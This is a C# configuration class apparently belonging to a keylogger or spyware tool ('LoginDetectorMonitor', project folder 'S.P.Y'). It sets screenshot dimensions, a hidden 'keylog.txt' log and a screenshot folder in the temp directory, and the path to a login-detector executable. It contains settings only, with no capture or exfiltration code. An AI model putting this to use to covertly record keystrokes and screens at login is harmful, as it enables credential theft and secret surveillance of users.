using System;
using System.IO;

namespace LoginDetectorMonitor.Configuration
{
    public class AppConfig
    {
        // Screenshot settings
        public int ScreenshotStartY { get; set; } = 90;
        public int ScreenshotWidth { get; set; } = 1920;
        public int ScreenshotHeight { get; set; } = 990;

        // Application settings
        public string LogFilePath { get; set; }
        public string ScreenshotDirectory { get; set; }
        public TimeSpan MaxCaptureDuration { get; set; }
        public string LoginDetectorPath { get; set; }

        // Default constructor with sensible defaults
        public AppConfig()
        {
            LogFilePath = Path.Combine(Path.GetTempPath(), "LoginMonitor", "keylog.txt");
            ScreenshotDirectory = Path.Combine(Path.GetTempPath(), "LoginMonitor", "Screenshots");
            LoginDetectorPath = @"M:\Dev\C\Microsoft Visual Studio\Project\S.P.Y\S.P.Y\x64\Release\LoginDetector.exe";
        }

        // Create default configuration
        public static AppConfig LoadConfig()
        {
            AppConfig config = new AppConfig();

            // Ensure directories exist
            Directory.CreateDirectory(Path.GetDirectoryName(config.LogFilePath));
            Directory.CreateDirectory(config.ScreenshotDirectory);

            return config;
        }
    }
}